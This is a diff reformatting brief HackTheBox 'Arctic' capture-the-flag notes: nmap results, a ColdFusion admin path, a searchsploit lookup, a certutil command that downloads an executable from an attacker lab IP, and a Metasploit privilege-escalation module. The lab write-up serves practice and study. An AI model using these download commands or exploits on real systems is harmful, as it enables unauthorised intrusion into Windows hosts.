@@ -1,22 +1,22 @@
-----------------------------------------------------
-# Author -> Shubham Rannpise
-----------------------------------------------------
 # Arctic
-# 25/3/2023
+
+
+| Key | Value |
+|-----|-------|
+| Platform | HackTheBox |
+| OS | Windows |
+| Difficulty | Easy |
+
 10.10.10.11
 
-----------------------------------------------------
-# nmap
-----------------------------------------------------
+## Recon
 PORT      STATE SERVICE VERSION
 135/tcp   open  msrpc   Microsoft Windows RPC
 8500/tcp  open  fmtp?
 49154/tcp open  msrpc   Microsoft Windows RPC
 
 
-----------------------------------------------------
-# exploitation
-----------------------------------------------------
+## Exploitation
 10.10.10.11:8500/CFIDE/administrator/
 
 └─$ searchsploit coldfusion
@@ -45,8 +45,6 @@ use msfconsole and exploit suggester
 certutil -urlcache -split -f "http://10.10.16.3/writeup.exe" exploit.exe
 
 
-----------------------------------------------------
-# priv esc
-----------------------------------------------------
+## Privilege Escalation
 
 exploit/windows/local/ms10_092_schelevator
